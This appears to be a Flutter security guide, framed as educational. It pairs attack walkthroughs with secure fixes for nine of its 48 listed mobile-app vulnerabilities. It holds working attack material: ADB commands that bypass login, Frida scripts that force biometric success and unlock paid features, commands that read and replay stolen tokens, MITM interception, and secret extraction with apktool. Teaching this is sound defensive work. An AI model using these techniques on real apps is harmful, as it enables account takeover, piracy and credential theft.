@@ -1,0 +1,8243 @@
+🔥 Flutter App Hacking & Security Vulnerabilities  
+🧠 For Educational & Ethical Research Only  
+
+
+🚨 Authentication & Login Attacks  
+1. OFFLINE LOGIN BYPASS USING LOCAL FLAG MANIPULATION  
+2. BIOMETRIC AUTHENTICATION BYPASS USING FRIDA HOOKING  
+3. DEBUG MODE ENABLED IN PRODUCTION  
+4. DEBUG FLAG ABUSE IN FLUTTER  
+5. BYPASSING FLUTTER APP LICENSING USING FRIDA  
+
+🔐 Token, API Key & Credential Theft  
+6. TOKEN THEFT VIA SHARED PREFERENCES  
+7. TOKEN HIJACKING VIA UNENCRYPTED HTTP TRAFFIC (MITM)  
+8. AUTH TOKEN REUSE  
+9. API KEY & SECRET EXPOSURE  
+10. HARDCODED API KEY EXPOSURE VIA APK DECOMPILATION  
+11. FLUTTER API KEY LEAKAGE VIA STATIC REVERSE ENGINEERING  
+12. GITHUB API KEY LEAKS VIA OPEN REPOSITORIES  
+
+🗄️ Storage & Local Data Exploits  
+13. FLUTTER SHARED PREFERENCES CREDENTIAL DUMP (via Rooted Device Access or Frida Hook)  
+14. SHARED PREFERENCES STORAGE ABUSE  
+15. FLUTTER LOCAL DATABASE DUMP VIA ROOT OR .DB EXFILTRATION  
+16. CLIPBOARD SNIFFING & HIJACKING  
+17. FLUTTER CLIPBOARD HIJACK  
+18. FILE PATH TRAVERSAL IN FLUTTER  
+19. SCREENSHOT LEAK  
+
+🧬 WebView & JavaScript Bridge Attacks  
+20. WEBVIEW XSS VIA UNTRUSTED CONTENT INJECTION  
+21. FLUTTER WEBVIEW JAVASCRIPT BRIDGE ABUSE (JS → DART CODE EXECUTION)  
+22. WebView JavaScript Bridge Injection (JS-to-Native Exploit in Flutter)
+23. JAVASCRIPT BRIDGE HIJACK IN FLUTTER WEBVIEW  
+24. FLUTTER WEBVIEW INJECTION  
+
+📡 Network & Firebase Exploits  
+25. UNPROTECTED FIREBASE – OPEN READ/WRITE ACCESS  
+26. FIREBASE MISCONFIGURATION IN FLUTTER  
+27. FIREBASE ANONYMOUS AUTH HIJACK & UID COLLISION  
+28. INSECURE DIRECT OBJECT REFERENCE (IDOR) – API ID TAMPERING  
+29. SSL PINNING BYPASS VIA FRIDA & CERTIFICATE FORGERY  
+
+🔗 Deep Link, URI & Intent Abuse  
+30. URI SCHEME HIJACK   
+31. DEEP LINK HIJACKING IN FLUTTER   
+32. FLUTTER APP SPOOFING  
+
+🧠 Runtime Memory & Code Execution    
+33.RUNTIME CODE INJECTION VIA FRIDA HOOKING ON FLUTTER PLUGINS
+34: DYNAMIC CODE EXECUTION IN FLUTTER
+35. RUNTIME MEMORY TOKEN EXTRACTION  
+36. RUNTIME MEMORY HOOKING
+37. RUNTIME MEMORY INSPECTION (RAM SNIFFING)  
+
+🧩 Reverse Engineering & Repack  
+38. REVERSE ENGINEERING VIA JADX & GHIDRA
+39. FLUTTER APP INTEGRITY BYPASS VIA APK REPACK + SIDE-LOADING  
+40. REVERSE ENGINEERING LIBAPP.SO TO EXTRACT HIDDEN SECRETS  
+41. FLUTTER CODE OBFUSCATION BYPASS  
+42. ASSET REPACK ATTACK  
+
+🎯 Asset Injection & Tampering  
+43. FLUTTER ASSET INJECTION  
+44. ASSET TAMPERING IN FLUTTER  
+
+🧪 Misc & Advanced Attacks  
+45. VERBOSE ERROR MESSAGES & STACK TRACE EXPOSURE  
+46. FLUTTER KEYBOARD INPUT LOGGING VIA NATIVE HOOK OR ACCESSIBILITY ABUSE  
+47. SUPPLY CHAIN ATTACK VIA MALICIOUS FLUTTER PLUGIN  
+48. DEEP OBJECT DESERIALIZATION ABUSE 
+
+
+
+........................................................................
+
+
+ATTACK 1: OFFLINE LOGIN BYPASS USING LOCAL FLAG MANIPULATION
+
+Description:
+Many Flutter apps store login status (`isLoggedIn = true`) or auth tokens in `SharedPreferences`. If the app does not verify this information with the backend at launch, attackers can manipulate these local values and bypass the login screen — even without an internet connection.
+
+---
+
+Exploitation Steps:
+
+1. Install the app and perform a real login once.
+2. The app writes `isLoggedIn: true` or an `auth_token` to local storage.
+3. Turn off network (Airplane Mode).
+4. Open a terminal and run the following:
+
+```bash
+adb shell
+run-as com.example.myapp
+cd shared_prefs
+cat user_session.xml
+```
+
+5. Edit the XML file like this:
+
+```xml
+<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
+<map>
+    <string name="isLoggedIn">true</string>
+    <string name="auth_token">ey_fake_jwt_token</string>
+</map>
+```
+
+6. Relaunch the app. It reads local values, skips login, and grants access.
+
+---
+
+Hack PoC Command:
+(For rooted/emulated device)
+
+```bash
+adb shell
+run-as com.example.myapp
+echo '<?xml version="1.0" encoding="utf-8"?>
+<map>
+    <string name="isLoggedIn">true</string>
+    <string name="auth_token">ey_fake_jwt_token</string>
+</map>' > shared_prefs/user_session.xml
+```
+
+---
+
+Why This Works:
+
+* The app does not verify local session with backend.
+* `SharedPreferences` are not encrypted.
+* App trusts the device blindly.
+
+---
+
+Secure Fix (Flutter + Backend):
+
+```dart
+final storage = FlutterSecureStorage();
+
+Future<bool> validateSession() async {
+  final token = await storage.read(key: 'auth_token');
+  if (token == null) return false;
+
+  final response = await http.get(
+    Uri.parse('https://api.example.com/auth/validate'),
+    headers: {
+      'Authorization': 'Bearer $token',
+    },
+  );
+
+  if (response.statusCode == 200) {
+    return true;
+  } else {
+    await storage.deleteAll();
+    return false;
+  }
+}
+```
+
+* Always validate tokens with backend at app launch.
+* Use `flutter_secure_storage` instead of `SharedPreferences`.
+* Auto logout if validation fails or token is missing/expired.
+
+---
+
+ Risk Level: HIGH
+This attack allows full offline app access — no password, no backend, no security. Fix it first.
+
+
+---------------------------------------------------------------------------
+
+
+
+ATTACK 2: BIOMETRIC AUTHENTICATION BYPASS USING FRIDA HOOKING
+
+Description:
+Flutter apps that use biometric authentication (like fingerprint or face unlock) often rely on native Android APIs through platform channels. On rooted or debug-enabled devices, attackers can **hook the native biometric callback methods** using **Frida**, forcing the app to think the biometric check passed — **without any fingerprint or face unlock.
+
+---
+
+Exploitation Steps (Frida Hack Walkthrough):
+
+1. Install the app on a rooted or emulator device.
+
+2. Confirm it uses biometric auth (e.g., via `local_auth` or platform code).
+
+3. Launch the app and wait at the biometric prompt.
+
+4. Run the Frida script below to **force biometric success callback**:
+
+```js
+Java.perform(function() {
+  console.log("[*] Attempting biometric bypass");
+
+  var CallbackClass = Java.use("android.hardware.biometrics.BiometricPrompt$AuthenticationCallback");
+
+  CallbackClass.onAuthenticationSucceeded.implementation = function(result) {
+    console.log("[*] Bypassed biometric - success forced");
+    this.onAuthenticationSucceeded(result);
+  };
+});
+```
+
+5. Run the attack:
+
+```bash
+frida -U -n com.example.myapp -l biometric_bypass.js
+```
+
+6. The app believes biometric auth succeeded, even if no fingerprint was used.
+
+---
+
+Why This Works:
+
+* Android biometric callbacks are part of native Java code.
+* `onAuthenticationSucceeded()` can be **hooked and forced**.
+* App trusts native result blindly without validating it server-side.
+
+---
+
+Flutter Integration: Typical (vulnerable) Use Case
+
+```dart
+final authenticated = await auth.authenticate(
+  localizedReason: 'Please authenticate',
+  biometricOnly: true,
+);
+if (authenticated) {
+  Navigator.push(...); // Full access
+}
+```
+
+No server check = trust is local only = exploitable.
+
+---
+
+Secure Fix: Server-Side Biometric Challenge
+
+1. After biometric success, request a **signed token** from the OS or KeyStore.
+2. Send that token to the backend to **verify biometric proof** (e.g., using a private key stored in the secure enclave).
+3. Only allow access if the server validates the response.
+
+❗ Flutter doesn't directly expose low-level biometric crypto, so combine with backend auth + token verification.
+
+---
+
+Alternate Fix: Device Root Detection
+
+Use packages like `device_info_plus`, `root_check`, or write custom platform code:
+
+```dart
+Future<bool> isRooted() async {
+  final result = await Process.run('which', ['su']);
+  return result.stdout.toString().contains('su');
+}
+```
+
+If rooted, disable biometric auth or limit functionality.
+
+---
+
+Extra Defense: Runtime Hook Detection
+
+Use Frida detection logic or native code to detect memory tampering.
+
+---
+
+Risk Level: HIGH
+If the app accepts local biometric success blindly, attackers can gain **full access without credentials or fingerprint**.
+
+---
+
+Always combine biometrics with backend session check
+Use Keystore for secure confirmation
+Block usage on rooted/debuggable devices
+
+-----------------------------------------------------------------------------
+
+
+ATTACK 3: DEBUG MODE ENABLED IN PRODUCTION
+
+Description:
+If a Flutter app is built in **debug mode** and released publicly, attackers can attach tools like **Frida**, **Android Studio Debugger**, or **adb shell** to access internal variables, logs, and even function calls — leading to full reverse engineering and security bypass.
+
+---
+
+Exploitation Steps (Frida / ADB Debugging)
+
+1. Launch the Flutter app on a real or emulated device.
+
+2. Check if it’s in debug mode:
+
+   * Debug banner visible? (top right of screen)
+   * Verbose logging in `adb logcat`?
+   * App debuggable = true in manifest?
+
+3. Confirm via ADB:
+
+```bash
+adb shell dumpsys package com.example.myapp | grep debuggable
+```
+
+If output is:
+
+```
+debuggable=true
+```
+
+✅ App is in debug mode and exploitable.
+
+4. Attach Frida or Android Debugger to the app:
+
+```bash
+frida -U -n com.example.myapp
+```
+
+Now you can:
+
+* Dump variables
+* Patch return values
+* Bypass checks like `if (isPremiumUser)`
+* Call internal methods without restrictions
+
+---
+
+Frida Script Example: Modify App Behavior in Runtime
+
+```js
+Java.perform(() => {
+  const LoginClass = Java.use('com.example.myapp.Auth');
+  LoginClass.isUserLoggedIn.implementation = function () {
+    return true;  // force login
+  };
+});
+```
+
+This works in debug mode because all protections are OFF.
+
+---
+
+Why This Works:
+
+* Flutter debug mode enables:
+
+  * Hot reload
+  * DevTools
+  * Verbose logs
+  * `debuggable=true` in manifest
+* These open the door for runtime manipulation and memory inspection.
+
+---
+
+Secure Fix 1: Always Build in Release Mode
+
+Build release APKs with:
+
+```bash
+flutter build apk --release
+```
+
+or for Play Store:
+
+```bash
+flutter build appbundle --release
+```
+
+This strips debug symbols, disables logs, and prevents debugger attachment.
+
+---
+
+**🛡️ Secure Fix 2: Remove Debug Visuals**
+
+Hide debug banner in release:
+
+```dart
+MaterialApp(
+  debugShowCheckedModeBanner: false,
+)
+```
+
+---
+
+**🛡️ Secure Fix 3: Protect Sensitive Logs**
+
+Avoid `print()` or `debugPrint()` with secrets:
+
+```dart
+if (kDebugMode) {
+  debugPrint('This runs only in debug');
+}
+```
+
+Use `kDebugMode` or `bool.fromEnvironment('dart.vm.product')` to protect logs in production.
+
+---
+
+Risk Level: HIGH
+Debug mode gives attackers total visibility into your app — logic, tokens, variables — everything.
+
+---
+
+Always ship release builds
+Never upload debug APK to Play Store
+Strip all debug code and symbols before production
+
+
+----------------------------------------------------------------------------
+
+
+
+ATTACK 4: DEBUG FLAG ABUSE IN FLUTTER
+
+(Unlock dev-only logic by misusing `kDebugMode`, `assert`, or BuildConfig flags)
+
+---
+
+Description:
+
+In Flutter and Android native, there are global flags used to check for debug builds:
+
+* `kDebugMode` – true in debug mode
+* `kReleaseMode` – true in release mode
+* `assert()` – only evaluated in debug mode
+* Native `BuildConfig.DEBUG` – true in debug builds on Android
+
+Attackers decompile the app and **force these flags to return true**, even on release builds, unlocking:
+
+*  Debug menus
+*  Admin panels
+*  Hidden test flows
+*  Payment sandbox bypass
+*  Dev APIs or staging switches
+
+ Especially dangerous when code is written like:
+
+```dart
+if (kDebugMode) {
+  showDeveloperConsole();
+}
+```
+
+---
+
+ Exploitation Steps – Debug Logic Abuse
+
+---
+
+ Step 1: Look for Debug Mode Branches
+
+Decompile or reverse the app using:
+
+```bash
+apktool d app-release.apk
+strings lib/arm64-v8a/libapp.so | grep -i debug
+```
+
+Look for logic like:
+
+```dart
+if (kDebugMode) {
+  enableGodMode();
+}
+```
+
+---
+
+ Step 2: Hook Debug Flags with Frida
+
+Hook `kDebugMode` logic via memory patching:
+
+```js
+Interceptor.attach(Module.findExportByName("libapp.so", "kDebugMode"), {
+  onLeave: function (retval) {
+    retval.replace(1); // force debug = true
+  }
+});
+```
+
+ App now thinks it's in debug mode = all dev features unlocked.
+
+---
+
+ Step 3: Enable Hidden Dev Tools
+
+Often developers wrap test UIs:
+
+```dart
+if (kDebugMode) {
+  return DevDashboard(); // local DB, logs, secret toggles
+}
+```
+
+ Now attacker sees these in production.
+
+---
+
+ Bonus: Use `assert()` Exploits
+
+Flutter’s `assert()` is **removed at compile-time** in release builds.
+
+```dart
+assert(user.isAdmin); //  Won’t run in release!
+```
+
+ Attackers can force release APKs to rebuild as debug — or locate builds where assert logic is **improperly relied on for security**.
+
+---
+
+# Why This Works
+
+* `kDebugMode` is just a flag — no runtime protection
+* Developers ship the same codebase for debug and release
+* Debug logic may be exposed in prod accidentally
+* Frida can **override runtime values in memory**
+
+---
+
+# Vulnerable Dart Example
+
+```dart
+Widget build(BuildContext context) {
+  return kDebugMode ? DeveloperPanel() : MainAppUI();
+}
+```
+
+ With Frida: user sees DeveloperPanel in production.
+
+---
+
+# Secure Fix 1: Remove Debug-Only Logic Entirely
+
+Instead of:
+
+```dart
+if (kDebugMode) unlockAdminFeature();
+```
+
+Use:
+
+```dart
+if (user.role == 'admin') unlockAdminFeature();
+```
+
+ Rely on authenticated conditions, not debug flags.
+
+---
+
+# Secure Fix 2: Compile with Proper Build Flags
+
+When building for release:
+
+```bash
+flutter build apk --release --dart-define=FLAVOR=prod
+```
+
+Use compile-time env variables to remove dev logic.
+
+---
+
+# Secure Fix 3: Guard Dev Panels with Backend Flags
+
+Backend controls visibility:
+
+```dart
+final isDevAllowed = await api.shouldShowDevPanel();
+if (isDevAllowed) showDevPanel();
+```
+
+ Requires server approval to enable hidden tools.
+
+---
+
+ Secure Fix 4: Disable Android `BuildConfig.DEBUG` Exposure
+
+In native code:
+
+```java
+if (BuildConfig.DEBUG) {
+  startDebugLogger();
+}
+```
+
+ Remove such logic in production — or override `BuildConfig.DEBUG` to `false`.
+
+---
+
+# Secure Fix 5: Run Static Analysis for Debug References
+
+Run:
+
+```bash
+grep -R "kDebugMode" lib/
+grep -R "BuildConfig.DEBUG" android/
+```
+
+ Ensure no critical logic is wrapped in debug-only conditions.
+
+---
+
+Risk Level: HIGH
+
+Debug flag abuse = dev flows in production, feature abuse, logic bypass
+
+---
+
+## Summary
+
+| 🔓 Vulnerability | kDebugMode or BuildConfig.DEBUG abused at runtime    |
+| ---------------- | ---------------------------------------------------- |
+| 💣 Impact        | Hidden menus, test flows, admin override             |
+| 🛠️ Fix          | Remove debug logic, use server toggles, static audit |
+
+
+
+----------------------------------------------------------------------------
+
+
+ATTACK 5 – Bypassing Flutter App Licensing & Premium Checks Using Frida (Dart Method Hooking)
+
+> *(This attack **disables paid feature checks, licensing systems, and premium validations** at runtime — without modifying the app binary.)*
+
+---
+
+Description:
+
+Flutter apps often implement premium access or licensing like this:
+
+```dart
+if (user.hasPremium) {
+  unlockFeatures();
+}
+```
+
+or
+
+```dart
+if (licenseService.isValid()) {
+  enableProMode();
+}
+```
+
+But this logic **can be hooked at runtime using [Frida](https://frida.re/)** — even if the app is obfuscated.
+
+Attackers can override Dart method return values in memory to **force-enable premium features** — no need to patch `.apk` or rebuild the app.
+
+---
+
+#  Exploitation Walkthrough
+
+ Prerequisites:
+
+* Rooted Android or emulator
+* `frida-server` running on device
+* USB debugging enabled
+* Dart symbol info **not stripped** (or guessed manually)
+
+---
+
+# Step 1: Attach Frida to Flutter App
+
+```bash
+frida -U -n com.example.myapp
+```
+
+ You are now connected to the live app.
+
+---
+
+# Step 2: Find Target Dart Method
+
+Let’s say you want to bypass:
+
+```dart
+bool get isPremium => _isPremium;
+```
+
+Or:
+
+```dart
+bool isLicenseValid() => true;
+```
+
+Use Frida’s Dart support to hook:
+
+```js
+// hook_dart_method.js
+const dart = require("frida-dart");
+
+rpc.exports = {
+  async init() {
+    const session = await dart.attach("com.example.myapp");
+
+    const premiumGetter = await session.getFunction("MyApp.User.isPremium");
+    await premiumGetter.setImplementation(() => {
+      console.log("isPremium hooked: returning true");
+      return true;
+    });
+  }
+};
+```
+
+Run it:
+
+```bash
+frida -U -n com.example.myapp -l hook_dart_method.js --no-pause
+```
+
+ Now any call to `user.isPremium` will return `true`.
+
+You just unlocked premium.
+
+---
+
+# Alternate: Hook Licensing Method
+
+Target:
+
+```dart
+LicenseService().isValid()
+```
+
+Hook:
+
+```js
+const licenseCheck = await session.getFunction("LicenseService.isValid");
+await licenseCheck.setImplementation(() => {
+  return true;
+});
+```
+
+ App behaves as if license is valid.
+
+---
+
+## Why It Works
+
+* Dart methods compiled to `.so` can still be hooked using Frida Dart
+* Flutter does not validate internal method integrity
+* Licensing logic is often client-side
+* Method return values can be overwritten **at runtime**
+
+---
+
+Fixes
+
+# Fix 1: Never Trust Local Premium Checks
+
+Instead of:
+
+```dart
+if (user.isPremium)
+```
+
+Use:
+
+```dart
+final result = await backend.verifyLicense(userId);
+if (result.isValid) unlockPremium();
+```
+
+ License must be validated on the **backend**, not in app memory.
+
+---
+
+# Fix 2: Dart Obfuscation (Partial Protection)
+
+```bash
+flutter build apk --obfuscate --split-debug-info=build/debug-info/
+```
+
+ Makes method names harder to locate, but not foolproof.
+
+---
+
+# Fix 3: Root Detection + Frida Detection
+
+Use native plugins to block on rooted or Frida-attached devices:
+
+```dart
+final isRooted = await JailbreakDetection.jailbroken;
+final isHooked = await detectFrida();
+```
+
+ Prevents attack on known compromised devices.
+
+---
+
+# Fix 4: Integrity Check on Method Calls
+
+Add randomized server tokens per session, check them before unlocking premium:
+
+```dart
+final token = await backend.getPremiumToken(userId);
+if (validate(token)) unlockPremium();
+```
+
+ Cannot be spoofed from memory alone.
+
+---
+
+# Summary
+
+|  Vulnerability | Dart methods can be hooked to bypass premium/license checks |
+| ---------------- | ----------------------------------------------------------- |
+|  Impact        | Full access to paid features without purchase               |
+|  Fix          | Move validation to backend, obfuscate Dart, detect Frida    |
+
+
+
+-------------------------------------------------------------------------------
+
+
+
+
+
+ATTACK 6: TOKEN THEFT VIA SHARED PREFERENCES
+
+Description:
+Many Flutter apps store authentication tokens (JWT, session ID) in plain `SharedPreferences`. These are stored unencrypted in XML files inside the app’s sandbox. On a rooted device or emulator, attackers can read them using ADB, then reuse the token to impersonate the user and make authenticated API calls.
+
+---
+
+Exploitation Steps:
+
+1. The app saves the token after login like this:
+
+```dart
+final prefs = await SharedPreferences.getInstance();
+prefs.setString('auth_token', token);
+```
+
+2. The attacker connects a rooted or emulated device to their PC.
+
+3. Run this ADB command:
+
+```bash
+adb shell
+run-as com.example.myapp
+cd shared_prefs
+cat user_session.xml
+```
+
+4. Look for:
+
+```xml
+<string name="auth_token">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</string>
+```
+
+5. Copy the token and make authenticated API requests manually:
+
+```bash
+curl -H "Authorization: Bearer <STOLEN_TOKEN>" https://api.example.com/user/profile
+```
+
+This works even if the attacker never logged in.
+
+---
+
+Why This Works:
+
+* `SharedPreferences` = plaintext storage.
+* No encryption or secure key management.
+* Tokens = credentials. If leaked, session hijack happens.
+
+---
+
+Hack PoC: ADB Dump Command
+
+```bash
+adb shell
+run-as com.example.myapp
+cat shared_prefs/user_session.xml
+```
+
+Hack PoC: Reuse Token in API Call:
+
+```bash
+curl -X GET https://api.example.com/user/profile \
+  -H "Authorization: Bearer ey_fake_jwt_token"
+```
+
+---
+
+Secure Fix: Use Encrypted Storage (Flutter Code)
+
+```dart
+import 'package:flutter_secure_storage/flutter_secure_storage.dart';
+
+final storage = FlutterSecureStorage();
+
+// Save token securely
+await storage.write(key: 'auth_token', value: token);
+
+// Read token securely
+final token = await storage.read(key: 'auth_token');
+
+// Optional: delete token on logout
+await storage.delete(key: 'auth_token');
+```
+
+`flutter_secure_storage` uses Android Keystore/iOS Keychain.
+Tokens are encrypted with system-level security — no plain file storage.
+
+---
+
+Pro Tip: Secure API Calls
+
+Always validate the token on the backend and reject expired/forged tokens.
+
+Example secure API request:
+
+```dart
+final response = await http.get(
+  Uri.parse('https://api.example.com/user/profile'),
+  headers: {'Authorization': 'Bearer $token'},
+);
+```
+
+---
+
+Risk Level: EXTREMELY HIGH
+One leaked token = full account compromise. Never store it unencrypted.
+
+
+
+-----------------------------------------------------------------------
+
+
+ATTACK 7: TOKEN HIJACKING VIA UNENCRYPTED HTTP TRAFFIC (MITM)
+
+Description:
+If a Flutter app sends tokens (JWT/session keys) over HTTP instead of HTTPS, or accepts self-signed certificates without SSL pinning, attackers can **intercept and steal tokens** using a proxy like **Burp Suite** or **MITMProxy**. These tokens can be reused to hijack user sessions.
+
+---
+
+Exploitation Steps (Real Burp MITM Walkthrough):
+
+1. Install **Burp Suite** on your computer.
+
+2. Set up your phone to use Burp as a proxy:
+
+   * Connect both phone and PC to the same network.
+   * On phone Wi-Fi > Proxy > Set to your PC's IP + Port 8080.
+
+3. Install Burp’s certificate on the device (optional step to capture HTTPS too).
+
+4. Open the app. If the app uses **HTTP**, Burp will intercept requests instantly:
+
+```
+POST /auth/login HTTP/1.1
+Host: api.example.com
+
+{
+  "email": "user@example.com",
+  "password": "pass123"
+}
+```
+
+Burp Response:
+
+```
+{
+  "auth_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+}
+```
+
+5. Copy the stolen token and replay it using curl:
+
+```bash
+curl -H "Authorization: Bearer eyJ...." https://api.example.com/profile
+```
+
+Boom — full account hijack without credentials.
+
+---
+
+Hack PoC: Reuse Token
+
+```bash
+curl -X GET https://api.example.com/profile \
+  -H "Authorization: Bearer ey_stolen_jwt_token"
+```
+
+Even works if app is closed — because server trusts stolen token.
+
+---
+
+Why This Works:
+
+* App sends sensitive data (token) in plaintext or over weak HTTPS.
+* No certificate pinning.
+* No backend verification like IP/user-agent matching.
+
+---
+
+Secure Fix 1: Always Use HTTPS
+
+Make sure all API URLs use HTTPS only:
+
+```dart
+final response = await http.get(
+  Uri.parse('https://api.example.com/profile'),
+  headers: {
+    'Authorization': 'Bearer $token',
+  },
+);
+```
+
+Never use `http://` for any sensitive requests.
+
+---
+
+Secure Fix 2: Add SSL Pinning (Flutter Code)
+
+Use `http` with SSL pinning using `dio` + `certificate_pinning` plugin or `http/io_client`:
+
+```dart
+import 'dart:io';
+import 'package:http/io_client.dart';
+
+HttpClient createSecureClient() {
+  final client = HttpClient()
+    ..badCertificateCallback = (X509Certificate cert, String host, int port) {
+      return cert.pem == yourTrustedCertPem; // Validate pinned cert
+    };
+  return client;
+}
+
+final ioClient = IOClient(createSecureClient());
+```
+
+This prevents MITM even if the attacker installs a custom CA.
+
+---
+
+Backend Protections (Optional):
+
+* Bind tokens to IP address / device fingerprint
+* Add refresh token rotation
+* Rate-limit repeated token uses
+
+---
+
+Risk Level: CRITICAL:
+Token interception = full account hijack. Any public Wi-Fi or malware can exploit this if HTTPS or pinning is missing.
+
+---------------------------------------------------------------------
+
+
+ATTACK 8: AUTH TOKEN REUSE
+
+(Steal & reuse session tokens from insecure storage, logs, or memory)
+
+---
+
+Description:
+
+Your app needs to store access tokens to authenticate API requests. But if these are stored insecurely:
+
+* In `SharedPreferences` (unencrypted)
+* In plain-text files
+* In logs (`print(token)`)
+* In memory without timeouts
+
+…then a rooted device, malware, or reverse engineer can **steal them** and make **authenticated API calls** — **even without knowing the user's password.**
+
+---
+
+# Exploitation Steps – Token Theft & Reuse
+
+---
+
+# Step 1: App Stores Token in SharedPreferences
+
+```dart
+final prefs = await SharedPreferences.getInstance();
+await prefs.setString("token", userToken);
+```
+
+ Stored as **plain text** in:
+
+```
+/data/data/com.myapp/shared_prefs/FlutterSharedPreferences.xml
+```
+
+Attacker runs:
+
+```bash
+adb shell cat /data/data/com.myapp/shared_prefs/FlutterSharedPreferences.xml
+```
+
+ Token exposed — can now be reused in Postman or curl.
+
+---
+
+# Step 2: App Logs Token for Debugging
+
+```dart
+print("Login success. Token: $token");
+```
+
+ Appears in `adb logcat`, even on release builds if not stripped.
+
+```bash
+adb logcat | grep Token
+```
+
+---
+
+# Step 3: Attacker Reuses Token to Access Authenticated API
+
+```bash
+curl -H "Authorization: Bearer $stolenToken" https://api.myapp.com/user/me
+```
+
+ Server accepts it — attacker now impersonates real user.
+
+---
+
+# Real-World Impacts
+
+| Exploit              | Risk                              |
+| -------------------- | --------------------------------- |
+| Stolen access token  | Full API access as user           |
+| Reused refresh token | Permanent session hijack          |
+| Dumped from memory   | Non-expiring sessions             |
+| Token copied to logs | Global exposure via logging tools |
+
+
+--
+
+# Vulnerable Dart Code
+
+```dart
+await prefs.setString("jwt_token", token); // Plaintext
+print("Token: $token");                   // Debug leak
+```
+
+---
+
+# Secure Fix 1: Use Encrypted SharedPreferences
+
+Use [`flutter_secure_storage`](https://pub.dev/packages/flutter_secure_storage):
+
+```dart
+final storage = FlutterSecureStorage();
+await storage.write(key: "token", value: userToken);
+```
+
+ Uses Android Keystore / iOS Keychain for encryption.
+
+---
+
+# Secure Fix 2: Avoid Logging Tokens
+
+```dart
+//  Bad
+print("Auth Token: $token");
+
+//  Good
+print("Login success.");
+```
+
+ Strip logs in release builds using `kDebugMode`.
+
+---
+
+# Secure Fix 3: Auto-Expire or Revoke Old Tokens
+
+Backend should:
+
+* Expire tokens after short use (e.g., 15 min access, 7 day refresh)
+* Invalidate old refresh tokens on re-login
+
+ Prevents long-term reuse if token is leaked.
+
+---
+
+# Secure Fix 4: Use Backend Token Verification (No Logic in App)
+
+Always validate tokens server-side:
+
+* Signature
+* Issuer
+* Audience
+* IP/device fingerprint (optional)
+
+ Prevents stolen token reuse on wrong device/location.
+
+---
+
+# Secure Fix 5: Rotate Tokens Periodically
+
+* Use **refresh tokens** that issue new access tokens periodically
+* Detect anomalies (e.g., refresh from wrong device) → force logout
+
+---
+
+# Risk Level: CRITICAL
+
+Stolen tokens = full account compromise.
+
+---
+
+# Summary
+
+|  Vulnerability | Insecure token storage or logging                     |
+| ---------------- | ----------------------------------------------------- |
+|  Impact        | Session hijack, impersonation                         |
+|  Fix          | Secure storage, no logs, short expiry, backend checks |
+
+
+
+-------------------------------------------------------------------------
+
+
+
+ATTACK 9: API KEY & SECRET EXPOSURE
+
+**(Extract hardcoded secrets from Flutter code or assets)**
+
+---
+
+Description:
+
+Flutter developers often:
+
+* Hardcode secrets in `main.dart` or `.env`
+* Store secrets inside `assets/config.json`, `.env`, or `.dart_tool`
+* Use Firebase, Stripe, Supabase, or REST APIs directly from Flutter with keys included
+
+Attackers can **reverse-engineer the APK or inspect assets** to extract:
+
+*  API keys
+*  Access tokens
+*  Environment settings
+*  Internal URLs
+*  Feature flags or debug switches
+
+ These keys are **fully extractable** and usable outside the app.
+
+---
+
+ Exploitation Steps — Extract Secrets from APK
+
+---
+
+# Step 1: Decompile APK with `apktool`
+
+```bash
+apktool d app-release.apk -o out/
+```
+
+---
+
+# Step 2: Inspect Asset Files
+
+Secrets are often found in:
+
+```
+out/assets/assets/env.json
+out/assets/assets/.env
+out/assets/assets/keys.json
+```
+
+*Example found:
+
+```json
+{
+  "api_key": "sk_live_51HV6...",
+  "base_url": "https://internal.myapi.com",
+  "mode": "prod"
+}
+```
+
+ These are usable directly by attackers from Postman or curl.
+
+---
+
+# Step 3: Search `libapp.so` for Hardcoded Keys
+
+```bash
+strings lib/arm64-v8a/libapp.so | grep -i "key\|token\|secret"
+```
+
+You may find:
+
+```
+sk_test_51Mj3c7...
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+```
+
+ These are **production keys** often used with Stripe, Supabase, Firebase Admin SDK, etc.
+
+---
+
+# Real-World Examples
+
+* Firebase config allows attacker to read/write entire DB
+* Stripe secret keys let attacker create fake payments
+* Admin JWT token lets attacker impersonate admin
+* Access token reuse allows API scraping or abuse
+
+---
+
+# Vulnerable Dart Code
+
+```dart
+const String stripeSecretKey = "sk_live_51HV6abc...";
+final String baseUrl = "https://internal-api.myapp.com";
+```
+
+Or:
+
+```dart
+final config = await rootBundle.loadString("assets/env.json");
+final key = json.decode(config)['api_key'];
+```
+
+ Whether in code or assets, **they get bundled into the APK**.
+
+---
+
+# Why This Works
+
+* Flutter includes assets & compiled constants in APK
+* Dart constants = embedded in compiled `.so` binaries
+* `assets/` folder is not encrypted
+* Dart doesn’t offer built-in secret storage
+* No runtime protection on API keys
+
+---
+
+# Secure Fix 1: Move All Secrets to Backend
+
+Instead of using keys in Flutter:
+
+ BAD:
+
+```dart
+await http.post("https://api.stripe.com/charge", headers: {
+  "Authorization": "Bearer sk_live_..."
+});
+```
+
+ GOOD:
+
+```dart
+// Send to backend
+await http.post("https://myapi.com/pay", body: {
+  "product": "premium"
+});
+
+// Backend processes payment securely with Stripe secret
+```
+
+ Secrets live only in the backend. The app sends **non-sensitive data.
+
+---
+
+# Secure Fix 2: Use API Gateway with Token Access Control
+
+Instead of exposing secret endpoints, wrap everything with:
+
+* JWT-based access control
+* Expiring tokens
+* Scope-restricted keys
+
+ Even if an endpoint is public, you control what it does.
+
+---
+
+# Secure Fix 3: Encrypt Assets (If Absolutely Needed)
+
+Use runtime AES decryption for sensitive files:
+
+```dart
+final encrypted = await rootBundle.load('assets/config.enc');
+final decrypted = aesDecrypt(encrypted.bytes, key);
+```
+
+But this requires:
+
+* Securely managing encryption keys (tricky in Flutter)
+* Native layer integration for true protection
+
+ This is **not foolproof** but slows down attackers.
+
+---
+
+# Secure Fix 4: Use Firebase AppCheck or Supabase RLS Policies
+
+For Firebase/Supabase:
+
+* Enable App Check
+* Lock down DB access unless request comes from valid app instance
+* Use Row Level Security (RLS) on all tables
+
+ Prevents abuse even if client config is public.
+
+---
+
+ Risk Level: CRITICAL
+
+API key exposure = full access to your server, billing, DB, or users.
+
+---
+
+ Summary
+
+|  Vulnerability | API keys/tokens stored in Dart code or Flutter assets |
+| ---------------- | ----------------------------------------------------- |
+|  Impact        | Payment fraud, DB overwrite, auth bypass              |
+|  Fix          | Move to backend, use secure token flow, AppCheck      |
